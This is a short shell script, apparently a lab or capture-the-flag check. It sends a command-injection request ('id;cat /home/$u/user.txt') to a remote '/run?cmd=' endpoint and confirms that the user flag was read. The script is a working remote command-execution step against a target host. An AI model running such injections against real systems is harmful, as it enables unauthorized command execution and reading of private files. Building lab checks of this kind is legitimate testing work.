set -eu
u="${BOX_U:?BOX_U is not set}"
out=$(curl -fsS "http://${BOX_HOST}:8445/run?cmd=id;cat%20/home/$u/user.txt")
echo "$out"
echo "$out" | grep -q 'FLAG{user-' || { echo "Samba user shell did not read the flag" >&2; exit 1; }
